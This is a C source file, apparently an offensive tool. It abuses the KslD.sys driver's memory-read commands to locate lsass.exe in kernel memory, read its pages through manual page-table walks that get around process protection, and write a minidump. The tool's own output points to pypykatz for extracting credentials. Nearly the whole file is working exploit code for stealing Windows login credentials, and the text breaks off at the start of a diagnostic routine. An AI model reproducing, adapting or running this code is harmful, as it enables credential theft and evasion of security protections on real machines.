
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")

#define KSLD_IOCTL  0x222044

#define SUBCMD_VERSION      0x00
#define SUBCMD_PHYS_READ    0x01
#define SUBCMD_CPU_REGS     0x02
#define SUBCMD_RESOLVE_NAME 0x07
#define SUBCMD_VTABLE_CALL  0x08
#define SUBCMD_IS_INIT      0x0B
#define SUBCMD_MMCOPY       0x0C

#define SUBCMD_PCI_DETECT   0x0E
#define SUBCMD_PCI_READ     0x0F
#define SUBCMD_AHCI_DETECT  0x10
#define SUBCMD_MMIO_READ    0x11
#define SUBCMD_CPUID_INFO   0x12
#define SUBCMD_MMIO_WRITE   0x13

ULONG EPROCESS_UNIQUEPROCESSID   = 0x440;
ULONG EPROCESS_ACTIVEPROCESSLINKS = 0x448;
ULONG EPROCESS_TOKEN             = 0x4B8;
ULONG EPROCESS_IMAGEFILENAME     = 0x5A8;
ULONG EPROCESS_PROTECTION        = 0x87A;

BOOL KslMmCopyRead(UINT64 srcAddr, PVOID outBuf, DWORD size);

void AutoDetectEprocessOffsets(UINT64 systemEprocess) {
    printf("[*] Auto-detecting EPROCESS offsets for this OS build...\n");
    BYTE buf[0xC00] = {0};
    for (DWORD off = 0; off < 0xC00; off += 0x100) {
        KslMmCopyRead(systemEprocess + off, buf + off, 0x100);
    }

    BOOL found = FALSE;
    for (ULONG off = 0x100; off < 0xB00; off += 8) {
        UINT64 val = *(UINT64*)(buf + off);
        if (val == 4) {
            UINT64 flink = *(UINT64*)(buf + off + 8);
            if (flink > 0xFFFF000000000000ULL && flink < 0xFFFFFFFFFFFFF000ULL) {
                EPROCESS_UNIQUEPROCESSID = off;
                EPROCESS_ACTIVEPROCESSLINKS = off + 8;
                printf("[+] UniqueProcessId offset:    0x%03X (found PID=4)\n", off);
                printf("[+] ActiveProcessLinks offset: 0x%03X\n", off + 8);
                found = TRUE;
                break;
            }
        }
    }
    if (!found) {
        printf("[-] Could not auto-detect PID offset, using defaults\n");
        return;
    }

    for (ULONG off = EPROCESS_UNIQUEPROCESSID; off < 0xB00; off++) {
        if (memcmp(buf + off, "System\0", 7) == 0) {
            EPROCESS_IMAGEFILENAME = off;
            printf("[+] ImageFileName offset:      0x%03X (found 'System')\n", off);
            break;
        }
    }

    ULONG tokenDelta = 0x78;
    UINT64 tokenCandidate = *(UINT64*)(buf + EPROCESS_UNIQUEPROCESSID + tokenDelta);
    if ((tokenCandidate & ~0xFULL) > 0xFFFF000000000000ULL) {
        EPROCESS_TOKEN = EPROCESS_UNIQUEPROCESSID + tokenDelta;
        printf("[+] Token offset:              0x%03X (value: 0x%016llX)\n", EPROCESS_TOKEN, tokenCandidate);
    } else {
        for (ULONG off = EPROCESS_ACTIVEPROCESSLINKS + 0x10; off < EPROCESS_IMAGEFILENAME; off += 8) {
            UINT64 val = *(UINT64*)(buf + off);
            UINT64 stripped = val & ~0xFULL;
            if (stripped > 0xFFFF800000000000ULL && stripped < 0xFFFFFFFFFFFFF000ULL &&
                (val & 0xF) > 0 && (val & 0xF) < 0x10) {
                EPROCESS_TOKEN = off;
                printf("[+] Token offset:              0x%03X (value: 0x%016llX, ref=%llu)\n", off, val, val & 0xF);
                break;
            }
        }
    }

    for (ULONG off = EPROCESS_IMAGEFILENAME + 0x100; off < 0xB80; off++) {
        BYTE val = buf[off];
        if (val == 0x72) {
            EPROCESS_PROTECTION = off;
            printf("[+] Protection offset:         0x%03X (value: 0x%02X)\n", off, val);
            break;
        }
    }

    printf("[*] Offsets detected successfully.\n\n");
}

void DumpRawEprocess(UINT64 eprocess) {
    printf("[*] Dumping raw EPROCESS at 0x%016llX (first 0x1000 bytes)\n", eprocess);
    printf("[*] Look for: QWORD value 4 (PID), string 'System', kernel pointers\n\n");

    for (DWORD off = 0; off < 0x1000; off += 0x100) {
        BYTE buf[0x100] = {0};
        KslMmCopyRead(eprocess + off, buf, 0x100);

        for (int i = 0; i < 0x100; i += 8) {
            UINT64 val = *(UINT64*)(buf + i);
            if (val == 4) {
                printf("*** PID=4 found at offset 0x%03X ***\n", off + i);
            }
        }
        for (int i = 0; i < 0xFA; i++) {
            if (buf[i] == 'S' && buf[i+1] == 'y' && buf[i+2] == 's' &&
                buf[i+3] == 't' && buf[i+4] == 'e' && buf[i+5] == 'm') {
                printf("*** 'System' string at offset 0x%03X ***\n", off + i);
            }
        }

        printf("+0x%03X: ", off);
        for (int i = 0; i < 0x40; i++) printf("%02X ", buf[i]);
        printf("\n        ");
        for (int i = 0x40; i < 0x80; i++) printf("%02X ", buf[i]);
        printf("\n        ");
        for (int i = 0x80; i < 0xC0; i++) printf("%02X ", buf[i]);
        printf("\n        ");
        for (int i = 0xC0; i < 0x100; i++) printf("%02X ", buf[i]);
        printf("\n\n");
    }
}

#pragma pack(push, 1)
typedef struct _KSLD_INPUT {
    ULONG   SubCommand;
    ULONG   ProcessorIdx;
    ULONGLONG PhysAddress;
    ULONGLONG Size;
} KSLD_INPUT;
#pragma pack(pop)

typedef NTSTATUS (NTAPI *pNtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef struct _SYSTEM_MODULE_ENTRY {
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} SYSTEM_MODULE_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG Count;
    SYSTEM_MODULE_ENTRY Modules[1];
} SYSTEM_MODULE_INFORMATION;

HANDLE hDevice = INVALID_HANDLE_VALUE;

BOOL EnablePrivilege(const char* priv) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;
    LUID luid;
    if (!LookupPrivilegeValueA(NULL, priv, &luid)) { CloseHandle(hToken); return FALSE; }
    TOKEN_PRIVILEGES tp = {0};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL ok = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    return ok && GetLastError() != ERROR_NOT_ALL_ASSIGNED;
}

BOOL OpenDevice() {
    const char* paths[] = {
        "\\\\.\\KslD",
        "\\\\.\\KslDrv",
        "\\\\.\\GLOBALROOT\\Device\\KslD",
        NULL
    };

    struct { DWORD access; const char* desc; } accessLevels[] = {
        { GENERIC_READ | GENERIC_WRITE,  "READ+WRITE" },
        { GENERIC_READ,                  "READ only" },
        { FILE_READ_DATA | FILE_WRITE_DATA, "FILE_RW" },
        { FILE_ANY_ACCESS,               "ANY_ACCESS" },
        { MAXIMUM_ALLOWED,               "MAXIMUM_ALLOWED" },
        { 0,                             "ZERO (query only)" },
    };

    for (int a = 0; a < sizeof(accessLevels)/sizeof(accessLevels[0]); a++) {
        for (int i = 0; paths[i]; i++) {
            hDevice = CreateFileA(paths[i],
                accessLevels[a].access,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                NULL, OPEN_EXISTING, 0, NULL);

            if (hDevice != INVALID_HANDLE_VALUE) {
                printf("[+] Opened device: %s (access: %s)\n", paths[i], accessLevels[a].desc);
                return TRUE;
            }
        }
        DWORD err = GetLastError();
        printf("[-] Access %s failed on all paths. Error: %lu\n", accessLevels[a].desc, err);
    }

    DWORD err = GetLastError();
    printf("\n[-] ALL open attempts failed. Error: %lu\n", err);
    if (err == 5) {
        printf("[-] Access denied at device object level (not IOCTL level).\n");
        printf("[-] This means the device security descriptor blocks your access.\n");
        printf("[-] The newer KslD.sys may have a restrictive SDDL on the device.\n");
        printf("[-] Check: reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\KslD /v DeviceName\n");
    } else if (err == 2 || err == 3) {
        printf("[-] Device not found. Start the driver:\n");
        printf("    sc start KslD\n");
    }
    return FALSE;
}

BOOL KslD_SendIoctl(KSLD_INPUT* input, DWORD inputSize,
                     PVOID outBuf, DWORD outSize, DWORD* bytesReturned) {
    return DeviceIoControl(hDevice, KSLD_IOCTL,
        input, inputSize,
        outBuf, outSize,
        bytesReturned, NULL);
}

BOOL ReadPhysicalMemory(ULONGLONG physAddr, PVOID buffer, ULONG size, DWORD* bytesRead) {
    ULONG pageOffset = (ULONG)(physAddr & 0xFFF);
    if (size > 0x1000 - pageOffset) size = 0x1000 - pageOffset;
    if (size == 0) return FALSE;

    KSLD_INPUT input = {0};
    input.SubCommand = SUBCMD_PHYS_READ;
    input.PhysAddress = physAddr;
    input.Size = size;

    if (!KslD_SendIoctl(&input, sizeof(input), buffer, size, bytesRead)) {
        return FALSE;
    }
    return TRUE;
}

BOOL ReadPhysicalMmio(ULONGLONG physAddr, PVOID buffer, DWORD* bytesRead) {
    KSLD_INPUT input = {0};
    input.SubCommand = SUBCMD_MMIO_READ;
    input.ProcessorIdx = 0;
    input.PhysAddress = physAddr;
    input.Size = 0x1000;

    if (!KslD_SendIoctl(&input, sizeof(input), buffer, 0x1000, bytesRead)) {
        return FALSE;
    }
    return TRUE;
}

void HexDump(const void* data, size_t size, ULONGLONG baseAddr) {
    const unsigned char* p = (const unsigned char*)data;
    for (size_t i = 0; i < size; i += 16) {
        printf("  %016llx  ", baseAddr + i);
        for (size_t j = 0; j < 16; j++) {
            if (i + j < size)
                printf("%02x ", p[i + j]);
            else
                printf("   ");
            if (j == 7) printf(" ");
        }
        printf(" |");
        for (size_t j = 0; j < 16 && i + j < size; j++) {
            unsigned char c = p[i + j];
            printf("%c", (c >= 0x20 && c < 0x7f) ? c : '.');
        }
        printf("|\n");
    }
}

PVOID GetKernelBase() {
    pNtQuerySystemInformation NtQSI = (pNtQuerySystemInformation)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");

    ULONG size = 0;
    NtQSI(11, NULL, 0, &size);

    SYSTEM_MODULE_INFORMATION* info = (SYSTEM_MODULE_INFORMATION*)malloc(size);
    if (NtQSI(11, info, size, &size) != 0) {
        free(info);
        return NULL;
    }

    PVOID base = info->Modules[0].ImageBase;
    printf("[*] ntoskrnl base (virtual): 0x%p\n", base);
    printf("[*] ntoskrnl image: %s\n", info->Modules[0].FullPathName + info->Modules[0].OffsetToFileName);
    printf("[*] ntoskrnl size: 0x%x bytes\n", info->Modules[0].ImageSize);
    free(info);
    return base;
}

ULONG64 GetPsInitialSystemProcess() {
    PVOID kernelBase = GetKernelBase();
    if (!kernelBase) return 0;

    HMODULE hNtos = LoadLibraryExA("ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!hNtos) {
        printf("[-] Cannot load ntoskrnl.exe in user mode\n");
        return 0;
    }

    PVOID pExport = GetProcAddress(hNtos, "PsInitialSystemProcess");
    if (!pExport) {
        FreeLibrary(hNtos);
        return 0;
    }

    ULONG64 offset = (ULONG64)pExport - (ULONG64)hNtos;
    FreeLibrary(hNtos);

    ULONG64 addr = (ULONG64)kernelBase + offset;
    printf("[*] PsInitialSystemProcess export @ 0x%llx\n", addr);
    return addr;
}

BOOL KslMmCopyRead(UINT64 kernelAddr, PVOID outData, DWORD size);
BOOL KslMmCopyReadPhys(UINT64 physAddr, PVOID outData, DWORD size);
UINT64 ResolveSymbol(const char* name);
UINT64 GetEprocessViaHandleTable(DWORD targetPid);
BOOL EnablePrivilege(const char* priv);


#define KPROCESS_DTB 0x028

UINT64 VirtToPhys(UINT64 cr3, UINT64 virtualAddr) {
    UINT64 pml4_idx = (virtualAddr >> 39) & 0x1FF;
    UINT64 pdpt_idx = (virtualAddr >> 30) & 0x1FF;
    UINT64 pd_idx   = (virtualAddr >> 21) & 0x1FF;
    UINT64 pt_idx   = (virtualAddr >> 12) & 0x1FF;

    UINT64 pml4e = 0;
    if (!KslMmCopyReadPhys((cr3 & ~0xFFFULL) + pml4_idx * 8, &pml4e, 8))
        return 0;
    if (!(pml4e & 1)) return 0;

    UINT64 pdpte = 0;
    if (!KslMmCopyReadPhys((pml4e & 0x000FFFFFFFFFF000ULL) + pdpt_idx * 8, &pdpte, 8))
        return 0;
    if (!(pdpte & 1)) return 0;
    if (pdpte & 0x80)
        return (pdpte & 0x000FFFFFC0000000ULL) + (virtualAddr & 0x3FFFFFFF);

    UINT64 pde = 0;
    if (!KslMmCopyReadPhys((pdpte & 0x000FFFFFFFFFF000ULL) + pd_idx * 8, &pde, 8))
        return 0;
    if (!(pde & 1)) return 0;
    if (pde & 0x80)
        return (pde & 0x000FFFFFFFE00000ULL) + (virtualAddr & 0x1FFFFF);

    UINT64 pte = 0;
    if (!KslMmCopyReadPhys((pde & 0x000FFFFFFFFFF000ULL) + pt_idx * 8, &pte, 8))
        return 0;
    if (pte & 1) {
        return (pte & 0x000FFFFFFFFFF000ULL) + (virtualAddr & 0xFFF);
    }
    if ((pte & 0x800) && !(pte & 0x400)) {
        return (pte & 0x000FFFFFFFFFF000ULL) + (virtualAddr & 0xFFF);
    }
    return 0;
}

BOOL ReadProcessMemoryViaPageWalk(UINT64 cr3, UINT64 targetVA, PVOID outBuf, DWORD size) {
    BYTE* out = (BYTE*)outBuf;
    DWORD bytesRead = 0;

    while (bytesRead < size) {
        UINT64 va = targetVA + bytesRead;
        UINT64 phys = VirtToPhys(cr3, va);
        if (phys == 0) return bytesRead > 0;

        DWORD pageOffset = (DWORD)(va & 0xFFF);
        DWORD chunkSize = 0x1000 - pageOffset;
        if (bytesRead + chunkSize > size)
            chunkSize = size - bytesRead;

        if (!KslMmCopyReadPhys(phys, out + bytesRead, chunkSize))
            return bytesRead > 0;

        bytesRead += chunkSize;
    }
    return TRUE;
}

int DoLsassDump() {
    printf("=== LSASS Dump via KslD.sys Page Table Walk ===\n\n");

    if (!OpenDevice()) return 1;
    EnablePrivilege("SeDebugPrivilege");

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = {0};
    pe.dwSize = sizeof(pe);
    DWORD lsassPid = 0;
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, "lsass.exe") == 0) {
                lsassPid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);

    if (!lsassPid) {
        printf("[-] lsass.exe not found\n");
        CloseHandle(hDevice);
        return 1;
    }
    printf("[+] lsass.exe PID: %lu\n", lsassPid);

    UINT64 pPSIP = ResolveSymbol("PsInitialSystemProcess");
    UINT64 systemEprocess = 0;
    if (pPSIP) KslMmCopyRead(pPSIP, &systemEprocess, 8);
    if (systemEprocess > 0xFFFF000000000000ULL) AutoDetectEprocessOffsets(systemEprocess);

    UINT64 lsassEprocess = 0;
    if (systemEprocess > 0xFFFF000000000000ULL) {
        UINT64 current = systemEprocess;
        for (int i = 0; i < 500; i++) {
            UINT64 pid = 0;
            KslMmCopyRead(current + EPROCESS_UNIQUEPROCESSID, &pid, 8);
            if ((DWORD)pid == lsassPid) {
                lsassEprocess = current;
                break;
            }
            UINT64 flink = 0;
            KslMmCopyRead(current + EPROCESS_ACTIVEPROCESSLINKS, &flink, 8);
            UINT64 next = flink - EPROCESS_ACTIVEPROCESSLINKS;
            if (next == systemEprocess || next < 0xFFFF000000000000ULL) break;
            current = next;
        }
    }

    if (!lsassEprocess) {
        printf("[-] Cannot find lsass EPROCESS\n");
        CloseHandle(hDevice);
        return 1;
    }
    printf("[+] lsass EPROCESS: 0x%016llX\n", lsassEprocess);

    BYTE prot = 0;
    KslMmCopyRead(lsassEprocess + EPROCESS_PROTECTION, &prot, 1);
    printf("[+] lsass Protection: 0x%02X", prot);
    if (prot & 0x07) printf(" [PPL Type:%u Signer:%u]", prot & 0x07, (prot >> 4) & 0x0F);
    printf("\n");

    UINT64 cr3 = 0;
    KslMmCopyRead(lsassEprocess + KPROCESS_DTB, &cr3, 8);
    printf("[+] lsass CR3 (DirectoryTableBase): 0x%016llX\n", cr3);

    if (cr3 == 0 || cr3 > 0x0000FFFFFFFFFFFFULL) {
        printf("[-] Invalid CR3\n");
        CloseHandle(hDevice);
        return 1;
    }

    ULONG pebOffset = EPROCESS_UNIQUEPROCESSID + 0x110;
    UINT64 pebAddr = 0;
    KslMmCopyRead(lsassEprocess + pebOffset, &pebAddr, 8);
    if (pebAddr == 0 || pebAddr > 0x00007FFFFFFFFFFFULL || (pebAddr & 0xFFF) != 0) {
        printf("[*] PEB at offset 0x%X = 0x%016llX (invalid), scanning...\n", pebOffset, pebAddr);
        for (ULONG off = EPROCESS_UNIQUEPROCESSID + 0x80; off < EPROCESS_IMAGEFILENAME; off += 8) {
            UINT64 val = 0;
            KslMmCopyRead(lsassEprocess + off, &val, 8);
            if (val > 0x10000 && val < 0x00007FFFFFFFFFFFULL && (val & 0xFFF) == 0) {
                pebAddr = val;
                pebOffset = off;
                printf("[+] Found PEB candidate at offset 0x%X = 0x%016llX\n", off, val);
                break;
            }
        }
    }
    printf("[+] lsass PEB: 0x%016llX\n", pebAddr);

    UINT64 pebPhys = VirtToPhys(cr3, pebAddr);
    printf("[+] PEB physical address: 0x%016llX\n", pebPhys);

    if (pebPhys == 0) {
        printf("[-] Page table walk failed — physical read may not work\n");
        printf("[*] Testing MmCopyMemory physical read (direction=1)...\n");

        BYTE testBuf[8] = {0};
        if (KslMmCopyReadPhys(0x1000, testBuf, 8)) {
            printf("[+] Physical read works! Bytes: %02X %02X %02X %02X\n",
                   testBuf[0], testBuf[1], testBuf[2], testBuf[3]);
        } else {
            printf("[-] Physical read failed. MmCopyMemory direction=1 not working.\n");
            printf("[*] Cannot dump lsass without physical memory read.\n");
            CloseHandle(hDevice);
            return 1;
        }
    }

    printf("\n[*] Step 5: Reading lsass memory via page table walk...\n");

    BYTE pebData[0x100] = {0};
    if (ReadProcessMemoryViaPageWalk(cr3, pebAddr, pebData, 0x100)) {
        printf("[+] PEB read successful! First bytes:\n    ");
        for (int i = 0; i < 32; i++) printf("%02X ", pebData[i]);
        printf("\n");

        UINT64 imageBase = *(UINT64*)(pebData + 0x10);
        printf("[+] lsass ImageBase: 0x%016llX\n", imageBase);

        BYTE peHeader[0x200] = {0};
        if (ReadProcessMemoryViaPageWalk(cr3, imageBase, peHeader, 0x200)) {
            if (peHeader[0] == 'M' && peHeader[1] == 'Z') {
                printf("[+] lsass MZ header verified!\n");
            }
        }
    } else {
        printf("[-] PEB read failed via page walk\n");
        CloseHandle(hDevice);
        return 1;
    }

    printf("\n[*] Step 6: Dumping lsass memory to minidump file...\n");

    UINT64 ldrAddr = *(UINT64*)(pebData + 0x18);
    printf("[+] PEB.Ldr: 0x%016llX\n", ldrAddr);

    struct ModInfo { UINT64 base; ULONG size; WCHAR name[130]; };
    ModInfo modules[60] = {0};
    int modCount = 0;

    BYTE ldrData[0x60] = {0};
    if (!ReadProcessMemoryViaPageWalk(cr3, ldrAddr, ldrData, 0x60)) {
        printf("[-] Cannot read PEB.Ldr\n"); CloseHandle(hDevice); return 1;
    }
    UINT64 listHead = ldrAddr + 0x20;
    UINT64 current = *(UINT64*)(ldrData + 0x20);
    while (current != listHead && modCount < 60) {
        BYTE entry[0x80] = {0};
        if (!ReadProcessMemoryViaPageWalk(cr3, current, entry, 0x80)) break;
        UINT64 dllBase = *(UINT64*)(entry + 0x20);
        ULONG  dllSize = *(ULONG*)(entry + 0x30);
        USHORT nameLen = *(USHORT*)(entry + 0x48);
        UINT64 nameBuf = *(UINT64*)(entry + 0x50);
        if (dllBase && dllSize > 0 && dllSize < 0x10000000) {
            modules[modCount].base = dllBase;
            modules[modCount].size = dllSize;
            if (nameLen > 0 && nameLen < 258 && nameBuf)
                ReadProcessMemoryViaPageWalk(cr3, nameBuf, modules[modCount].name, nameLen < 258 ? nameLen : 258);
            printf("    0x%016llX  %8u  %ls\n", dllBase, dllSize, modules[modCount].name);
            modCount++;
        }
        UINT64 next = *(UINT64*)(entry);
        if (next == current || next == 0) break;
        current = next;
    }
    printf("[+] Found %d modules\n", modCount);

    char dumpPath[MAX_PATH];
    snprintf(dumpPath, MAX_PATH, "lsass_%lu.dmp", lsassPid);
    FILE* dumpFile = fopen(dumpPath, "wb");
    if (!dumpFile) { printf("[-] Cannot create %s\n", dumpPath); CloseHandle(hDevice); return 1; }


    DWORD headerSize = 32;
    DWORD streamDirOffset = headerSize;
    DWORD numStreams = 3;
    DWORD streamDirSize = numStreams * 12;
    DWORD sysInfoOffset = streamDirOffset + streamDirSize;
    DWORD sysInfoSize = 56;
    DWORD moduleListOffset = sysInfoOffset + sysInfoSize;

    DWORD moduleEntrySize = 108;
    DWORD moduleHeaderSize = 4 + modCount * moduleEntrySize;
    DWORD stringTableOffset = moduleListOffset + moduleHeaderSize;

    DWORD stringTableSize = 0;
    DWORD* stringOffsets = (DWORD*)calloc(modCount, sizeof(DWORD));
    for (int i = 0; i < modCount; i++) {
        stringOffsets[i] = stringTableOffset + stringTableSize;
        DWORD nameBytes = (DWORD)(wcslen(modules[i].name) * 2);
        stringTableSize += 4 + nameBytes;
    }

    DWORD mem64ListOffset = stringTableOffset + stringTableSize;

    DWORD signature = 0x504D444D;
    DWORD version = 0x0000A793 | (0x0611 << 16);
    DWORD checksum = 0;
    DWORD timestamp = GetTickCount();
    UINT64 flags = 0x00000002;

    fwrite(&signature, 4, 1, dumpFile);
    fwrite(&version, 4, 1, dumpFile);
    fwrite(&numStreams, 4, 1, dumpFile);
    fwrite(&streamDirOffset, 4, 1, dumpFile);
    fwrite(&checksum, 4, 1, dumpFile);
    fwrite(&timestamp, 4, 1, dumpFile);
    fwrite(&flags, 8, 1, dumpFile);

    DWORD st7 = 7; fwrite(&st7, 4, 1, dumpFile);
    fwrite(&sysInfoSize, 4, 1, dumpFile);
    fwrite(&sysInfoOffset, 4, 1, dumpFile);

    DWORD st4 = 4; DWORD modListSize = moduleHeaderSize;
    fwrite(&st4, 4, 1, dumpFile);
    fwrite(&modListSize, 4, 1, dumpFile);
    fwrite(&moduleListOffset, 4, 1, dumpFile);

    DWORD st9 = 9;
    long mem64DirPos = ftell(dumpFile);
    DWORD mem64PlaceholderSize = 0;
    fwrite(&st9, 4, 1, dumpFile);
    fwrite(&mem64PlaceholderSize, 4, 1, dumpFile);
    fwrite(&mem64ListOffset, 4, 1, dumpFile);

    WORD processorArch = 9;
    fwrite(&processorArch, 2, 1, dumpFile);
    WORD processorLevel = 6; fwrite(&processorLevel, 2, 1, dumpFile);
    WORD processorRevision = 0; fwrite(&processorRevision, 2, 1, dumpFile);
    BYTE numberOfProcessors = 8; fwrite(&numberOfProcessors, 1, 1, dumpFile);
    BYTE productType = 1; fwrite(&productType, 1, 1, dumpFile);
    DWORD majorVersion = 10; fwrite(&majorVersion, 4, 1, dumpFile);
    DWORD minorVersion = 0; fwrite(&minorVersion, 4, 1, dumpFile);
    OSVERSIONINFOEXW osvi = {0};
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    RtlGetVersionPtr pRtlGetVersion = (RtlGetVersionPtr)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlGetVersion");
    if (pRtlGetVersion) pRtlGetVersion((PRTL_OSVERSIONINFOW)&osvi);
    DWORD buildNumber = osvi.dwBuildNumber ? osvi.dwBuildNumber : 22621;
    printf("[*] OS Build: %lu\n", buildNumber);
    fwrite(&buildNumber, 4, 1, dumpFile);
    DWORD platformId = 2; fwrite(&platformId, 4, 1, dumpFile);
    DWORD csdVersionRva = 0; fwrite(&csdVersionRva, 4, 1, dumpFile);
    WORD suiteMask = 0x100; fwrite(&suiteMask, 2, 1, dumpFile);
    WORD reserved2 = 0; fwrite(&reserved2, 2, 1, dumpFile);
    BYTE cpuInfo[24] = {0};
    cpuInfo[0] = 'G'; cpuInfo[1] = 'e'; cpuInfo[2] = 'n'; cpuInfo[3] = 'u';
    cpuInfo[4] = 'i'; cpuInfo[5] = 'n'; cpuInfo[6] = 'e'; cpuInfo[7] = 'I';
    cpuInfo[8] = 'n'; cpuInfo[9] = 't'; cpuInfo[10] = 'e'; cpuInfo[11] = 'l';
    fwrite(cpuInfo, 24, 1, dumpFile);

    DWORD modCountDw = (DWORD)modCount;
    fwrite(&modCountDw, 4, 1, dumpFile);

    for (int i = 0; i < modCount; i++) {
        UINT64 baseOfImage = modules[i].base; fwrite(&baseOfImage, 8, 1, dumpFile);
        DWORD sizeOfImage = modules[i].size; fwrite(&sizeOfImage, 4, 1, dumpFile);
        DWORD modChecksum = 0; fwrite(&modChecksum, 4, 1, dumpFile);
        DWORD modTimestamp = 0; fwrite(&modTimestamp, 4, 1, dumpFile);
        DWORD moduleNameRva = stringOffsets[i]; fwrite(&moduleNameRva, 4, 1, dumpFile);
        BYTE versionInfo[52] = {0}; fwrite(versionInfo, 52, 1, dumpFile);
        BYTE records[16] = {0}; fwrite(records, 16, 1, dumpFile);
        BYTE reserved[16] = {0}; fwrite(reserved, 16, 1, dumpFile);
    }

    for (int i = 0; i < modCount; i++) {
        DWORD nameBytes = (DWORD)(wcslen(modules[i].name) * 2);
        fwrite(&nameBytes, 4, 1, dumpFile);
        fwrite(modules[i].name, 1, nameBytes, dumpFile);
    }

    printf("[*] Scanning lsass VA space via page tables...\n");

    struct MemRange { UINT64 start; UINT64 size; };
    MemRange* ranges = (MemRange*)calloc(65536, sizeof(MemRange));
    int rangeCount = 0;

    UINT64 lastEnd = 0;
    for (int pml4i = 0; pml4i < 256 && rangeCount < 65000; pml4i++) {
        UINT64 pml4e = 0;
        if (!KslMmCopyReadPhys(cr3 + pml4i * 8, &pml4e, 8) || !(pml4e & 1)) continue;
        UINT64 pdptBase = pml4e & 0x000FFFFFFFFFF000ULL;

        for (int pdpti = 0; pdpti < 512 && rangeCount < 65000; pdpti++) {
            UINT64 pdpte = 0;
            if (!KslMmCopyReadPhys(pdptBase + pdpti * 8, &pdpte, 8) || !(pdpte & 1)) continue;
            if (pdpte & 0x80) continue;
            UINT64 pdBase = pdpte & 0x000FFFFFFFFFF000ULL;

            for (int pdi = 0; pdi < 512 && rangeCount < 65000; pdi++) {
                UINT64 pde = 0;
                if (!KslMmCopyReadPhys(pdBase + pdi * 8, &pde, 8) || !(pde & 1)) continue;

                UINT64 vaBase = ((UINT64)pml4i << 39) | ((UINT64)pdpti << 30) | ((UINT64)pdi << 21);

                if (pde & 0x80) {
                    if (rangeCount > 0 && ranges[rangeCount-1].start + ranges[rangeCount-1].size == vaBase) {
                        ranges[rangeCount-1].size += 0x200000;
                    } else {
                        ranges[rangeCount].start = vaBase;
                        ranges[rangeCount].size = 0x200000;
                        rangeCount++;
                    }
                    continue;
                }

                UINT64 ptBase = pde & 0x000FFFFFFFFFF000ULL;
                for (int pti = 0; pti < 512 && rangeCount < 65000; pti++) {
                    UINT64 pte = 0;
                    if (!KslMmCopyReadPhys(ptBase + pti * 8, &pte, 8)) continue;
                    BOOL present = (pte & 1) != 0;
                    BOOL transition = (!present && (pte & 0x800) && !(pte & 0x400));
                    if (!present && !transition) continue;

                    UINT64 va = vaBase | ((UINT64)pti << 12);
                    if (rangeCount > 0 && ranges[rangeCount-1].start + ranges[rangeCount-1].size == va) {
                        ranges[rangeCount-1].size += 0x1000;
                    } else {
                        ranges[rangeCount].start = va;
                        ranges[rangeCount].size = 0x1000;
                        rangeCount++;
                    }
                }
            }
        }
        if (pml4i % 16 == 0) printf("    PML4 %d/256 — %d ranges found\r", pml4i, rangeCount);
    }
    printf("[+] Found %d memory ranges in lsass VA space        \n", rangeCount);

    UINT64 totalMemSize = 0;
    for (int i = 0; i < rangeCount; i++) totalMemSize += ranges[i].size;
    printf("[+] Total memory: %llu KB (%llu MB)\n", totalMemSize/1024, totalMemSize/(1024*1024));

    DWORD mem64HeaderSz = 16 + rangeCount * 16;
    DWORD rawDataOff = mem64ListOffset + mem64HeaderSz;

    UINT64 numberOfRanges = (UINT64)rangeCount;
    UINT64 baseRva = (UINT64)rawDataOff;
    fwrite(&numberOfRanges, 8, 1, dumpFile);
    fwrite(&baseRva, 8, 1, dumpFile);

    for (int i = 0; i < rangeCount; i++) {
        fwrite(&ranges[i].start, 8, 1, dumpFile);
        fwrite(&ranges[i].size, 8, 1, dumpFile);
    }

    DWORD totalDumped = 0;
    for (int i = 0; i < rangeCount; i++) {
        for (UINT64 offset = 0; offset < ranges[i].size; offset += 0x1000) {
            BYTE page[0x1000] = {0};
            ReadProcessMemoryViaPageWalk(cr3, ranges[i].start + offset, page, 0x1000);
            fwrite(page, 1, 0x1000, dumpFile);
            totalDumped += 0x1000;
        }
        if (i % 100 == 0) printf("    Dumping range %d/%d (%u MB)...\r", i, rangeCount, totalDumped/(1024*1024));
    }
    free(ranges);

    DWORD mem64TotalSize = 16 + rangeCount * 16;
    fseek(dumpFile, (long)(mem64DirPos + 4), SEEK_SET);
    fwrite(&mem64TotalSize, 4, 1, dumpFile);
    fseek(dumpFile, 0, SEEK_END);

    free(stringOffsets);
    fclose(dumpFile);
    printf("\n[+] Minidump saved: %s (%u bytes, %d modules)\n", dumpPath, totalDumped, modCount);
    printf("[*] Extract credentials:\n");
    printf("    pypykatz lsa minidump %s\n", dumpPath);

    CloseHandle(hDevice);
    return 0;
}


int DoDiagnosePhysRead() {
    printf("=== Diagnosing sub-cmd 0x01 (Physical Memory Read) ===\n\n");

    if (!OpenDevice()) return 1;
    EnablePrivilege("SeDebugPrivilege");

